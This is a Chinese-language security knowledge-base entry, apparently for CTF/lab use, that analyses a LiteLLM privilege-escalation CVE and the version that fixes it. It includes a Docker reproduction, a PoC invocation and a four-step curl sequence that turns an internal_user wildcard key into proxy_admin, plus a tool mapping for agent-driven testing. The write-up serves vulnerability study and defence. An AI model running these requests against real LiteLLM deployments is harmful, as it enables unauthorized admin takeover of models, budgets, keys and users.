---
id: "ctf-website/09-cve/05-litellm-privesc"
title: "LiteLLM：API Key 生成绕过角色限制 + 自提权（CVE-2026-47101）"
title_en: "LiteLLM: API Key Generation Bypass Role Restrictions + Self-Privilege Escalation (CVE-2026-47101)"
summary: >
  LiteLLM三层授权防线失效分析：第一层/key/generate未验证allowed_routes与角色匹配导致低权限用户生成通配符key、第二层路由授权回退到API key的allowed_routes匹配、第三层/user/update允许自修改角色。internal_user通过通配符key自提权为proxy_admin实现完全管理接口接管。
summary_en: >
  Three-layer authorization bypass analysis for LiteLLM: layer 1 - /key/generate does not verify allowed_routes match user role, enabling low-privilege users to generate wildcard keys; layer 2 - route authorization falls back to API key allowed_routes matching; layer 3 - /user/update allows self role modification. Internal users escalate to proxy_admin via wildcard keys for full admin takeover.
board: "ctf-website"
category: "09-cve"
signals: ["LiteLLM", "privilege escalation", "API key bypass", "权限提升", "internal_user to proxy_admin", "CVE-2026-47101", "allowed_routes"]
mcp_tools: ["kb_router", "http_probe", "workspace_write_text"]
keywords: ["CVE-2026-47101", "LiteLLM", "权限提升", "API key生成绕过", "allowed_routes", "proxy_admin", "internal_user", "LLM网关安全"]
difficulty: "intermediate"
tags: ["cve", "privilege-escalation", "api-security", "ctf"]
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# LiteLLM：API Key 生成绕过角色限制 + 自提权（CVE-2026-47101）

## 1. 受影响版本

LiteLLM `< 1.83.14`（在 v1.82.6 上确认）。修复版本：v1.83.14。

## 2. 根因：三层授权防线失效

**第一层：`/key/generate` 未验证 `allowed_routes` 与角色匹配**

```python
# 低权限用户可请求超出角色的路由权限
resp = api_post("/key/generate", token, {"allowed_routes": ["/*"]})
# → 获得通配符 key，系统未验证请求者是否有权申请
```

**第二层：路由授权回退逻辑**

角色校验失败后，系统回退到 API key 的 `allowed_routes` 进行匹配。攻击者生成的通配符 key 变成"通行证"。

**第三层：`/user/update` 允许自修改角色**

```python
# 使用通配符 key 把自己的角色改为 proxy_admin
resp = api_post("/user/update", wildcard_key, {
    "user_id": "<user_id>",
    "user_role": "proxy_admin"
})
```

## 3. 调用链

```
internal_user 认证
    ↓ POST /key/generate
路由授权检查 → allowed_routes=["/*"]（未验证角色边界）
    ↓ 返回通配符 key
通配符 key 调用 POST /user/update
    ↓ user_role=proxy_admin
路由授权回退到 API key 的 allowed_routes 匹配
    ↓ allowed_routes=["/*"] → 允许
用户角色变更为 proxy_admin
    ↓ GET /user/list
权限提升成功 → 管理接口完全开放
```

## 4. 调用链（curl）

## 5. 复现

```bash
# Docker 一键环境
cd "CVE-2026-47101 LiteLLM"
docker compose up -d
sleep 15
# 漏洞版本监听 http://localhost:4000
# 修复版本（对比用）: docker compose --profile fixed up -d → http://localhost:4001

# 使用 PoC
cd exploit && pip install -r requirements.txt
python3 exploit.py --target http://localhost:4000 --master-key sk-litellm-master-key
```

### 手动 curl 复现

```bash
# 1. 创建低权限用户
curl -s -X POST http://localhost:4000/user/new \
  -H "Authorization: Bearer sk-litellm-master-key" \
  -H "Content-Type: application/json" \
  -d '{"role": "internal_user"}'

# 2. 生成通配符 key
curl -s -X POST http://localhost:4000/key/generate \
  -H "Authorization: Bearer <internal_user_key>" \
  -H "Content-Type: application/json" \
  -d '{"allowed_routes": ["/*"]}'

# 3. 提权到 proxy_admin
curl -s -X POST http://localhost:4000/user/update \
  -H "Authorization: Bearer <wildcard_key>" \
  -H "Content-Type: application/json" \
  -d '{"user_id": "<user_id>", "user_role": "proxy_admin"}'

# 4. 验证管理员访问
curl -s -X GET http://localhost:4000/user/list \
  -H "Authorization: Bearer <wildcard_key>"
```

## 6. PoC 参数

| 参数 | 说明 |
|------|------|
| `--target` | LiteLLM 地址 |
| `--master-key` | 管理员 master key |
| `--key` | 已有的 internal_user key |
| `--verify-only` | 仅验证当前 key 是否已是管理员 |

## 攻击链

```
1. 以低权限 internal_user 身份认证（或获取一枚 internal_user key）
2. POST /key/generate 申请 allowed_routes=["/*"] → 系统未校验申请者角色边界 → 拿到通配符 key
3. 用通配符 key POST /user/update 把自己 user_role 改为 proxy_admin → 路由授权回退到 key 的 allowed_routes 匹配放行
4. GET /user/list 验证已获得管理员视图 → 提权成功
5. 以 proxy_admin 完全控制管理接口（模型/预算/密钥/用户）
```

## Evidence

记录: `/key/generate` 返回的通配符 key、`/user/update` 响应、`/user/list` 返回的管理员用户列表

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 LiteLLM / 权限提升 / API key 信号搜索 |
| HTTP 探测 | `http_probe` | 验证各 API 端点可达性 |
| 写分析笔记 | `workspace_write_text` | 记录提权过程 |

## 参考资料

| 来源 | 链接 |
|------|------|
| 上游 PoC | https://github.com/learner202649/CVE-2026-47101-PoC |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2026-47101 |
| Obsidian Security | https://www.obsidiansecurity.com/blog/litellm-privilege-escalation-rce |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-47101%20LiteLLM |
